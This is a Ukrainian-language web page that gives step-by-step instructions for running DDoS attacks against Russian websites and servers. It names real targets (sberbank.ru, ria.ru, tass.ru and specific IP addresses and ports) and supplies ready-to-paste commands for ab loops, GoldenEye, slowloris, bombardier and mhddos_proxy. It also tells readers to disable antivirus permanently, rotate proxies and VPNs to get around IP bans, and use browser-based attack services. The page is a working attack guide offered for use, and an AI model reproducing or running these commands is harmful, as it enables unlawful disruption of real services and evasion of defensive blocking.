<main>
  <h2 class="title_h2">Інструкції з налаштування DDOS атак на країну ворога</h2>

  <a href="/vps/" data-toggle="tooltip" data-title="Не гвалтуйте свій ПК та домашню мережу, виділіть трохи часу та розгорніть справжню боротьбу з ворогом!" class="btn btn-sm btn-danger  mt-3"><i class="fas fa-server"></i> Інструкція по розгортанню VPS</a>

    <a href="/powerful/"  class="btn btn-sm btn-danger  mt-3"><i class="fas fa-server"></i>Наші кастомні інструменти</a>

  <ul class="nav nav-tabs mt-5" id="myTab" role="tablist">
    <li class="nav-item" role="presentation">
      <a class="nav-link active" id="ubuntu-tab" data-toggle="tab" href="#ubuntu" role="tab" aria-controls="ubuntu" aria-selected="true">Інструкція для Ubuntu</a>
    </li>
    <li class="nav-item" role="presentation">
      <a class="nav-link" id="windows-tab" data-toggle="tab" href="#windows" role="tab" aria-controls="windows" aria-selected="false">Інструкція для Windows</a>
    </li>
    <li class="nav-item" role="presentation">
      <a class="nav-link" id="site-tab" data-toggle="tab" href="#site" role="tab" aria-controls="site" aria-selected="false">Для всіх через браузер</a>
    </li>
  </ul>

  <div class="tab-content" id="myTabContent">

    <!-- Ubuntu Tab -->

    <div class="tab-pane fade show active" id="ubuntu" role="tabpanel" aria-labelledby="ubuntu-tab">

    <h4>Якщо Ви маєте Apache вебсервер</h4>
    Спосіб виконувати багато запитів використовувати ab, йде разом з apache (постачається для тестування навантаження)
    запускати наприклад так
    <pre>
        <code class="copy">ab -c 50 -n 30000 "https://sberbank.ru/"</code>
    </pre>
    -с 50 - 50 одночасних потоків, але це до моменту блокування ip на їхній системі, тоді треба його міняти, якщо є можливість

    І зациклити
    вміст ab.sh
    <pre>
        <code>#!/bin/bash
      while true
      do
      ./abrun.sh
      done
      </code>
    </pre>

    вміст abrun.sh
    <pre>
      <code>
      #!/bin/bash
      ab -c 50 -n 30000 https://sberbank.ru/
      </code>
    </pre>

    домен підставити потрібний<br>
    зробити ab.sh, abrun.sh виконуваними<br>
    chmod +x ab.sh<br>
    chmod +x abrun.sh<br>
    розмістити в одному каталозі, запускати
    ./ab.sh

    <br><br>

    <h4>GoldenEye</h4>
    <a target="_blank" href="https://github.com/jseidl/GoldenEye">Посилання на репозиторій</a>
    Клонувати вихідний код код GoldenEye с GitHub.
    <pre>
      <code>git clone https://github.com/jseidl/GoldenEye.git</code>
      </pre>
    Буде створено новий каталог, давайте відкриємо його.
    Введіть наступну команду, щоб відкрити його.</br>
    <code>cd GoldenEye/</code><br>
    Час провести DOS-атаку на сайт жертви
    Введіть наступну команду, щоб виконати DOS з параметрами за замовчуванням
    <pre>
      <code>
      ./goldeneye.py http://victim-website.com
      </code>
    </pre>

    можна з аргументами.<br>
    Додайте значення для робочих (-w), сокетів (-s) та методу (-m)
    ./goldeneye.py http://victim-website.com -w 100 -s 70 -m post

    Щоб зупинити атаку, просто натисніть CTRL+C<br>
    Є багато пам'яті, треба стежити за завантаженням
    <br>
    <br>


    <h4>Інструкція для встановлення софту Docker для Ubuntu</h4>

    <span>Потрібно кожну строку вводити в термінал почергово, як написано нижче</span>

    <pre><code>
    sudo apt update
    sudo apt install -y docker.io
    sudo systemctl enable docker --now
    docker
    sudo usermod -aG docker $USER
</code></pre>

    Низже це одна команда
    <pre><code class="copy">printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list ; curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg</code></pre>

    Продовжуємо. Один рядок - одна команда:
    <pre><code>
    sudo apt update
    sudo apt install -y docker-ce docker-ce-cli containerd.io
    sudo systemctl unmask docker.service
    sudo systemctl unmask docker.socket
    sudo systemctl start docker.service
    sudo chmod 666 /var/run/docker.sock
    sudo docker run hello-world
    </code></pre>

    <h5>Якщо після вводу останньої команди Ви побачили в терміналі напис: Hello from Docker! То Ви зробили все вірно!</h5>

    <div>
      <img src="/image/docker_hello.jpg" alt="">
    </div>

    <div class="text-content">
      <p>Далі переходимо безпосередньо до атак</p>
      Для атак я рекомендую використовувати скрипти mhddos_proxy, у цього способу є декілька переваг, а саме:
      <ul>
        <li>Не потребує VPN - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи</li>
        <li>Атака декількох цілей з автоматичним балансуванням навантаження</li>
        <li>Використовує різні методи для атаки і змінює їх в процесі роботи</li>
        <li>Простий та зрозумілий інтерфейс з іменованими параметрами</li>
      </ul>

      <p><b>ВИМКНІТЬ VPN</b> - використовуються проксі, VPN тільки заважатиме!</p>
    </div>

    <h2>Docker команди для запуску атак</h2>

    <p>При першому запуску команди відбудеться скачування та встановлення скриптів, потім скрипт почне отримувати проксі-сервера для атак ну і почне свою роботу. За замовченням скрипт самостійно буде оновлювати проксі кожні 10 хвилин, тому нас не зупинити!</p>

    Для атаки HTTP(S) по URL
    <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 https://ria.ru https://tass.ru</code>
      </pre>

    Для атаки HTTP по IP + PORT

    <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 5.188.56.124:80 5.188.56.124:3606</code>
    </pre>


    Для атак по протоколу TCP

    <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code>
    </pre>

    Для оновлення скриптів
    <pre><code class="copy">docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest</code></pre>


    <h2 class="title_h2">Налаштування</h2>
    <p>УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ, можна вказувати і до і після переліку цілей</p>

    <p>Змінити навантаження: -t XXX - кількість потоків на кожне ядро CPU, за замовчуванням - 300, я викорустовую -t 2500, спробуйте -t 1000, а потім підіймайте</p>

    <p>Щоб переглянути інформацію про хід атаки, додайте прапорець --debug</p>


    <h2 class="title_h2">Для поставки задач з пабліку IT ARMY of Ukraine</h2>
    <p>Посилання: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

    Щоб спростити постановку задачі для атаки, скористуйтесь моїм сервісом підготовки ip-адрес → <a href="https://ddosukraine.com.ua/" target="_blank">Ось тут</a>
    <p>Він зробить всю роботу за Вас та відформатує повідомлення від пабліку і віддасть в одному рядку  тільки ip-адреси з зазначеними в задачі портами в потрібному форматі, Вам залишиться тільки підставити команду:
    <pre><code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000</code></pre>
    і додати отримані адреси в кінець команди.</p>

    <!--<div class="alert alert-warning d-flex align-items-center mt-3" role="alert">
      <i class="fa-solid fa-triangle-exclamation"></i><span>Рекомендую використовувати одночасно для атаки не більше 15 адрес, бо може тупо не запуститись</span>
    </div>-->

  </div>

  <!-- Ubuntu tab END -->


  <!-- Windows Tab -->
  <div class="tab-pane fade show img" id="windows" role="tabpanel" aria-labelledby="windows-tab">

    <b>Низже є 2 вкладки для різних налаштувань:</b>

    <ol>
      <li>Варіант через python більш кращий через відсутність навантаження додаткового ПО у вигляді Docker</li>
      <li>Варіант через Docker</li>
    </ol>


    <div class="alert alert-warning">
      <b>Увага!</b> Перед встановлення ПО вимкніть антивірус. Всі антивіруси визначають ПО для атак, як потенційно небезпече і блокує файли. Вимкніть на постійній основі, бо коли Ви перезавантажите ПК, то антивірус знову почне працювати і видалить файли
    </div>

    <ul class="nav nav-tabs mt-5 mb-3" id="myTab" role="tablist">
      <li class="nav-item" role="presentation">
        <a class="nav-link active" id="pyton-tab1" data-toggle="tab" href="#pyton1" role="tab" aria-controls="pyton1" aria-selected="true">Інструкція для Python (MHDDoS)</a>
      </li>
      <li class="nav-item" role="presentation">
        <a class="nav-link" id="pyton-tab2" data-toggle="tab" href="#pyton2" role="tab" aria-controls="pyton2" aria-selected="false">Інструкція для Python (slowloris)</a>
      </li>
      <li class="nav-item" role="presentation">
        <a class="nav-link" id="docker-tab" data-toggle="tab" href="#docker" role="tab" aria-controls="docker" aria-selected="false">Інструкція для Docker</a>
      </li>
    </ul>

    <div class="tab-content" id="myTabContent">

      <div class="tab-pane fade show img active" id="pyton1" role="tabpanel" aria-labelledby="pyton-tab1">

        <h3>Налаштування через Python (MHDDoS)</h3>

        Завантажте і встановіть Python та Git
        <ul>
          <li>
            <a href="https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" target="_blank">https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe</a>
          </li>
          <li>
            <a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe" target="_blank">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a>
          </li>
        </ul>

        <p>Створіть порожню папку на робочому столі, нприклад: ddos, перейдіть до неї і запустіть в ній Git Bash</p>

        <img src="/image/gitbash_start.jpg" alt="">

        <p>Далі водіть наступні команди почергово</p>
        <pre><code class="copy">git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git</code></pre>

        <pre><code class="copy">cd mhddos_proxy</code></pre>

        <!-- <pre><code class="copy">git clone https://github.com/MHProDev/MHDDoS.git</code></pre> -->

        <pre><code class="copy">python -m pip install -r requirements.txt</code></pre>

        <p>Зверніть увагу, використовується саме <b>python</b> а не python3.</p>

        <p>Якщо у Вас після цього кроку виникла ось така помилка:</p>
        <pre><code>bash: python: command not found</code></pre>
        <p>Або ось така:</p>
        <pre><code>bash: permission denied</code></pre>

        <p><a class="btn btn-primary mt-3 mb-3" data-toggle="collapse" href="#target">Тут вирішення проблеми</a></p>

        <div class="collapse mb-3" id="target">
          <div class="card card-body">
            <p>Це проблема виникла у зв'язку або відсутності встановлення Python (перевірте чи виконали Ви перший пункт цієї інструкції) або система не бачить шляху до встановленного Python і системі потрібна ручна допомога</p>

            <ol>
              <li>
                Для цього Вам потрібно перейти до властивостей Вашого комп'ютера. Клікніть правою кнопкою миші по ярлику "Мій комп'ютер та оберіть властивості".
                <img src="/image/python/python_1.jpg" alt="">
              </li>

              <li>
                Далі перейдіть в додаткові налаштування системи
                <img src="/image/python/python_2.jpg" alt="">
              </li>
              <li>
                Потім у змінні середовища
                <img src="/image/python/python_3.jpg" alt="">
              </li>
              <li>
                Знаходите в системних змінних пункт, під назвою Path, клікаєте на нього і натискаєте кнопку "Змінити"
                <img src="/image/python/python_4.jpg" alt="">
              </li>
              <li>
                Далі Вам потрібно створити шлях до Вашого вже встановленного Python, за замовчення він встановлюється за шляхом: C:\Users\{Назва Вашого Користувача}\AppData\local\Programs\Python\Python310-2\
                <p>Папка AppData прихована, тому ввімкніть показувати приховані елементи у налаштуваннях провідника</p>
                <p>Або запустіть ще раз встановлення Python, оберіть пункт Modify, далі Next і Вам покаже шлях вже встановленого python на Вашу систему</p>
                <p>Відкриваєте цей шлях у провідники, у мене це C:\Python39, копіюєте його</p>
                <img src="/image/python/python_5.jpg" alt="">
              </li>

              <li>
                Повертаєтесь у змінення змінної середовища, та натискаєте кпопку "Створити" та вставляєте скопійований шлях
                <img src="/image/python/python_6.jpg" alt="">
              </li>

              <li>
                Потім ще раз натискаєте створити і вставляєте ще раз цей же шлях і дописуєте "\Scripts", щоб у Вас було 2 доданих Вами шляхи
                <img src="/image/python/python_7.jpg" alt="">
              </li>
              <li>
                Все. Проблему вирішено. Закрийте, якщо у Вас був відкритий GitBash і відкрийте знову, щоб він оновив введені Вами шляхи і спробуйте знову запустити команду встановлення:
                <pre><code class="copy">python -m pip install -r MHDDoS/requirements.txt</code></pre>
              </li>
            </ol>
          </div>
        </div>



        Для атаки HTTP(S) по URL
        <pre><code class="copy">python runner.py -t 1000 https://ria.ru https://tass.ru</code></pre>

        Для атаки HTTP по IP + PORT

        <pre><code class="copy">python runner.py -t 1000 5.188.56.124:80 5.188.56.124:3606</code></pre>


        Для атак по протоколу TCP

        <pre><code class="copy">python runner.py tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code></pre>


        <h2 class="title_h2">Налаштування</h2>
        <p>УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ, можна вказувати і до і після переліку цілей</p>

        <p>Змінити навантаження: -t XXX - кількість потоків на кожне ядро CPU, за замовчуванням - 300, я викорустовую -t 2500, спробуйте -t 1000, а потім підіймайте</p>

        <p>Щоб переглянути інформацію про хід атаки, додайте прапорець --debug</p>


        <h2 class="title_h2">Для поставки задач з пабліку IT ARMY of Ukraine</h2>
        <p>Посилання: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

        Щоб спростити постановку задачі для атаки, скористуйтесь моїм сервісом підготовки ip-адрес → <a href="https://ddosukraine.com.ua/" target="_blank">Ось тут</a>
        <p>Він зробить всю роботу за Вас та відформатує повідомлення від пабліку і віддасть в одному рядку  тільки ip-адреси з зазначеними в задачі портами в потрібному форматі, Вам залишиться тільки підставити команду:
        <pre><code class="copy">python runner.py -t 1000 </code></pre>
        і додати отримані адреси в кінець команди.</p>

        <!--<div class="alert alert-warning d-flex align-items-center mt-3" role="alert">
          <i class="fa-solid fa-triangle-exclamation"></i><span>Рекомендую використовувати одночасно для атаки не більше 15 адрес, бо може тупо не запуститись</span>
        </div>-->

        <li>
          Ось та виглядатиме заспамлення сайтів окупантів:
        </li>

        <img src="/image/docker/docker_install12.jpg" alt="">

      </div>

      <div class="tab-pane fade show img" id="pyton2" role="tabpanel" aria-labelledby="pyton-tab2">

        <h3>Налаштування через Python (slowloris)</h3>

        Завантажте і встановіть Python та Git
        <ul>
          <li>
            <a href="https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" target="_blank">https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe</a>
          </li>
          <li>
            <a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe" target="_blank">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a>
          </li>
        </ul>

        <p>Створіть порожню папку на робочому столі, нприклад: ddos, перейдіть до неї і запустіть в ній Git Bash</p>

        <img src="/image/gitbash_start.jpg" alt="">

        <p>Далі водіть наступні команди почергово</p>
        <pre><code class="copy">git clone https://github.com/gkbrk/slowloris</code></pre>

        <pre><code class="copy">cd slowloris</code></pre>

        <p>Запускаєму пайтон скріпт</p>>

        <pre><code class="copy">python loris.py -s240 -v URL</code></pre>

        <p>- s = кількість підключень</p>
        <p>- v = початкова перевірка, необовʼясково</p>
        <p> URL - адреса сайту без www (Наприклад 1tv.ru)</p>
      </div>

      <!-- Windows Docker Tab -->

      <div class="tab-pane fade show img" id="docker" role="tabpanel" aria-labelledby="docker-tab">
        <ol>
          <li>Перейдіть на сайт <a href="https://www.docker.com/products/docker-desktop" target="_blank">https://www.docker.com/products/docker-desktop</a></li>
          <li>Натисніть:
            <img src="/image/docker/docker_install.jpg" alt="">
          </li>

          <li>Запускаємо завантажений файл «Docker Desktop Installer»</li>
          <li>У випадку попередження від системи тиснемо «Виконати»
            <br>
            <img src="/image/docker/docker_install2.jpg" alt="">
          </li>
          <li>Залишаємо відміченні прапорці для встановлення потрібних доповнень і тиснемо «ОК»</li>
          <img src="/image/docker/docker_install3.jpg" alt="">

          <li>Чекаємо встановлення всіх пакетів даних (може трошки довго все йти).</li>
          <li>Після завершення встановлення погоджуємось з перезавантаженням ПК (тиснемо синю кнопочку):</li>
          <img src="/image/docker/docker_install4.jpg" alt="">
          <li>Коли ваш комп’ютер перезавантажився запускаємо програму</li>
          <li>У вікні, що з’явилось встановлюємо прапорець «I accept the terms» і тиснемо синю клавішу «Accept»</li>
          <img src="/image/docker/docker_install5.jpg" alt="">
          <li>Далі потрібно довстановити пакет оновлень для ядра Linux. Щоб ці файли доставити тисніть на посилання вікна, що з’явилось (це вікно не закриваємо):</li>
          <img src="/image/docker/docker_install6.jpg" alt="">
          <li>Або за посиланням - <a href="https://docs.microsoft.com/ru-ru/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package" target="_blank">Посилання</a>
            І тиснемо на посилання для скачування пакету оновлень:</li>
          <img src="/image/docker/docker_install7.jpg" alt="">
          <li>Після завантаження запускаємо файл «wsl_update_x64.msi»</li>
          <li>Встановлюємо оновлення (NEXT та далі FINISH):</li>
          <li>Тиснемо клавішу RESTART</li>
          <img src="/image/docker/docker_install8.jpg" alt="">
          <li>Очікуємо запуску Docker</li>
          <img src="/image/docker/docker_install9.jpg" alt="">
          <li>Після пропускаємо інформацію про особливості роботи програми. Клавіша “Skip tutorial”</li>
          <img src="/image/docker/docker_install10.jpg" alt="">
          <li>Далі запускаємо командний рядок. Тиснемо на клавіатурі клавіші Windows+R та прописуємо “cmd”. Щоб здійснювати атаку на декілька сайтів можна запускати декілька таких терміналів повторюючи крок 16</li>
          <img src="/image/docker/docker_install11.jpg" alt="">

          <h2>Docker команди для запуску атак</h2>

          <p>При першому запуску команди відбудеться скачування та встановлення скриптів, потім скрипт почне отримувати проксі-сервера для атак ну і почне свою роботу. За замовченням скрипт самостійно буде оновлювати проксі кожні 10 хвилин, тому нас не зупинити!</p>

          Для атаки HTTP(S) по URL
          <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 https://ria.ru https://tass.ru</code>
            </pre>

          обо
          <pre>
              <code class="copy">docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l URL</code>
            </pre>
          <p>де:
            "-с" - кількість підключень
            "-d" - час
            "URL" - адреса сайту (https://ria.ru https://tass.ru)
            Вашу айпи адресу можуть забанити тому бажано регулярно перепідкючати VPN щоб помінявся айпи.</p>

          Для атаки HTTP по IP + PORT

          <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 5.188.56.124:80 5.188.56.124:3606</code>
        </pre>


          Для атак по протоколу TCP

          <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code>
        </pre>


          <h2 class="title_h2">Налаштування</h2>
          <p>УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ, можна вказувати і до і після переліку цілей</p>

          <p>Змінити навантаження: -t XXX - кількість потоків на кожне ядро CPU, за замовчуванням - 300, я викорустовую -t 2500, спробуйте -t 1000, а потім підіймайте</p>

          <p>Щоб переглянути інформацію про хід атаки, додайте прапорець --debug</p>


          <h2 class="title_h2">Для поставки задач з пабліку IT ARMY of Ukraine</h2>
          <p>Посилання: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

          Щоб спростити постановку задачі для атаки, скористуйтесь моїм сервісом підготовки ip-адрес → <a href="https://ddosukraine.com.ua/" target="_blank">Ось тут</a>
          <p>Він зробить всю роботу за Вас та відформатує повідомлення від пабліку і віддасть в одному рядку  тільки ip-адреси з зазначеними в задачі портами в потрібному форматі, Вам залишиться тільки підставити команду:
          <pre><code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000</code></pre>
          і додати отримані адреси в кінець команди.</p>

          <li>
            Ось та виглядатиме заспамлення сайтів окупантів:
          </li>

          <img src="/image/docker/docker_install12.jpg" alt="">
        </ol>
      </div>
    </div>



    <h2 class="title_h2">Слава Україні!</h2>

  </div>
  <!-- Windows tab END -->


  <!-- Site Attack -->
  <div class="tab-pane fade show img" id="site" role="tabpanel" aria-labelledby="site-tab">
    Якщо у Вас не вистачає навичок або немає можливості використовувати попередні інструкції, але є велике бажання та інтернет - скористайтесь одним із веб-сервісів для ддос-атак:
    <p><span class="text-danger"><b>Не забудьте використовувати VPN!</b> </span></p>

    <div class="text-content">
      Список VPN:
      <button class="btn btn-sm btn-secondary" data-toggle="modal" data-target="#vpnServicesModal"><i class="fa fa-info-circle" aria-hidden="true"></i> VPN Сервіси</button>
    </div>

    <hr>
    <h2 class="title_h2">Перший сервіс: Attack UI</h2>
    <p>Цей сервіс має усі налаштування та є можливість вказувати:</p>
    <ul>
      <li>Актуальні цілі від IT Army підставляться автоматично</li>
      <li>Адреси для атак</li>
      <li>Ліміт запитів за інтервал</li>
      <li>Довжину інтервалу</li>
      <li>А також перевіряти доступність кожного атакованого Вами сайту (вже на сторінці керування DDOS)</li>
    </ul>
    <p>На цьому сервісі все просто, в декілька кроків Ви можете приєднатися до боротьби!</p>
    Відкрити сервіс: <a class="btn btn-danger" href="https://war.apexi.tech/attack/ddos/config/?targets=https://ddosukraine.com.ua/check/targets.json" target="_blank">war.apexi.tech</a>

    <hr>

    <h2 class="title_h2">Другий сервіс: Ban-dera</h2>
    <p>Цей сервіс не має ручних налаштувань по цілях, хлопці самостійно додають та змінюють цілі.</p>
    Адреса сервісу: <a href="https://ban-dera.com" target="_blank">https://ban-dera.com</a>
    <p>Все просто: потрібно тільки залишити вкладку з сайтом, скрипт зробить все сам!</p>

    <ul>
      <b>⁉️ Часті запитання:</b>
      <li>Так, можна декілька вкладок.</li>
      <li>Можна з VPN і без нього. Але краще з ним.</li>
      <li>Можна з Tor-браузера.</li>
      <li>Перезавантаження сторінки не обов'язкове, скрипт повністю автономний.</li>
      <li>Можна дивитись як "бігають" запити 😅</li>
      <li>Можна поширити це друзям.</li>
      <li>Сайт оновлюється, список цілей - розширюється.</li>
    </ul>

    <hr>

    <h2 class="title_h2">Атака на пропонандистські сайти</h2>
    <p>Українська версія «Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про події в Україні.</p>
    <p>Ми вважаємо, що краще їх закрити та дозволити людям переключитися на достовірні новини.</p>
    <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські пропагандистські сайти запитами та створить величезне навантаження на їхню інфраструктуру.</p>
    <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його відкритим.  Невеликий внесок кожного з нас врятує Україну 🙏</p>

    <ul>
      <li><a target="_blank" href="https://stop-russian-desinformation.near.page/">Посилання 1</a></li>
      <li><a target="_blank" href="https://2022pollquizinru.xyz/">Посилання 2</a></li>
      <li><a target="_blank" href="https://war.apexi.tech/attack/ddos/config/?targets=https://ddosukraine.com.ua/check/targets.json">Посилання 3</a></li>
      <li><a target="_blank" href="https://playforukraine.org/">Гра 2048</a></li>
    </ul>

    <p>Разом до перемоги!</p>

    <hr>

    <div class="alert alert-warning" role="alert">
      <b>Увага!</b> Щоб ваші зусилля не були марними використовуйте також VPN. Кожен адміністратор сайту може ознайомитись з потоком вхідних IP адрес і просто заборонити використовувати свій сайт жителям України. VPN потрібний, щоб закосити під своїх і підключитись з росії чи білорусії (навмисне з маленької бо не заслуговують вони такої честі).</a>
    </div>

    <div class="text-content">
      Список VPN:
      <button class="btn btn-sm btn-secondary" data-toggle="modal" data-target="#vpnServicesModal"><i class="fa fa-info-circle" aria-hidden="true"></i> VPN Сервіси</button>
    </div>

    <div class="alert alert-danger" role="alert">
      <b>Увага!</b> Не використовуйте адреси для атак з неперевірених пабліків. Вас можуть використовувати "в сліпу" надаючі адреси Українських сервісів. Якщо Ви не впевнені в джерелі інформації, то використовуйте офіційний паблік <b>IT Army of Ukraine</b> для свої атак → <a href="https://t.me/itarmyofukraine2022" target="_blank" class="alert-link">Паблік It Army</a>
    </div>

  </div>

</main>



<!-- Modal VPN -->
<div data-v-534550dc="" id="vpnServicesModal" tabindex="-1" aria-labelledby="vpnServicesModalLabel" class="modal fade" aria-modal="true" role="dialog" style="display: none;">
  <div data-v-534550dc="" class="modal-dialog modal-dialog-centered modal-xl">
    <div data-v-534550dc="" class="modal-content text-start">
      <div data-v-534550dc="" class="modal-header">
        <h5 data-v-534550dc="" id="vpnServicesModalLabel" class="modal-title">VPN послуги</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div data-v-534550dc="" class="modal-body">
        <div data-v-534550dc="" class="row table-container">
          <table data-v-534550dc="" class="table text-center table-hover">
            <thead data-v-534550dc="">
            <tr data-v-534550dc="">
              <td data-v-534550dc="">VPN послуга</td>
              <td data-v-534550dc="">Сервера в рашці</td>
              <td data-v-534550dc="">Є безкоштовно</td>
              <td data-v-534550dc="">Є демо/тест період</td>
              <td data-v-534550dc="">Додатково</td>
            </tr>
            </thead>
            <tbody data-v-534550dc="">
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.hotspotshield.com/" target="_blank">Hotspot Shield</a></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""></td>
            </tr>
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://clearvpn.com/" target="_blank">ClearVPN</a></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc="">Безкоштовно для України</td>
            </tr>
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.urban-vpn.com/" target="_blank">urbanVPN</a></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""></td>
            </tr>
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://onlineshop.f-secure.com/789/purl-free-freedome-for-ukraine" target="_blank">Freedome Secure</a></td>
              <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
              <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc="">6 месяців безкоштовно для України</td>
            </tr>
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.vpnunlimited.com/stop-russian-aggression" target="_blank">VPN Unlimited</a></td>
              <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
              <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
              <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
              <td data-v-534550dc="">Рік безкоштовно для України</td>
            </tr>
            <tr data-v-534550dc="">
              <td data-v-534550dc=""><a data-v-534550dc="" href="https://protonvpn.com/ua/" target="_blank">ProtonVPN</a></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
              <td data-v-534550dc=""></td>
            </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>